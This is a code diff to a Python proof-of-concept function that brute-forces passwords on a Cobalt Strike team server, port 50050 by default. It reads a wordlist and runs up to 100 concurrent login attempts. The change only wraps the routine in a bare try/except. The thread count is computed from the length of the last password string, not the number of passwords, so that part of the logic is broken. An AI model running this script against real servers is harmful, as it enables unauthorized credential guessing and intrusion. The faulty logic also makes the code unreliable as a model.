@@ -93,24 +93,27 @@ def password_check(passwords, host, port, result):
 def poc(url):
     # url = "http://www.example.org:22222/default.html?ct=32&op=92&item=98"
     # --> host:www.example.org   port:22222
-    if url[:4] != "http":
-        url = "http://" + url
-    o = urlparse(url)
-    host = socket.gethostbyname(o.hostname)
-    port = int(o.port) if o.port else 50050
+    try:
+        if url[:4] != "http":
+            url = "http://" + url
+        o = urlparse(url)
+        host = socket.gethostbyname(o.hostname)
+        port = int(o.port) if o.port else 50050
 
-    passwords = Queue()
-    with open(paths.DATA_PATH + '/cobalt-strike.txt') as f:
-        for password in f.read().splitlines():
-            passwords.put(password)
-    result = []
-    if len(password) <= 100:
-        threads_count = len(password)
-    else:
-        threads_count = 100
-    gevent.joinall([gevent.spawn(password_check, passwords, host, port, result) for i in range(threads_count)])
+        passwords = Queue()
+        with open(paths.DATA_PATH + '/cobalt-strike.txt') as f:
+            for password in f.read().splitlines():
+                passwords.put(password)
+        result = []
+        if len(password) <= 100:
+            threads_count = len(password)
+        else:
+            threads_count = 100
+        gevent.joinall([gevent.spawn(password_check, passwords, host, port, result) for i in range(threads_count)])
 
-    if result:
-        return result
-    else:
+        if result:
+            return result
+        else:
+            return False
+    except:
         return False
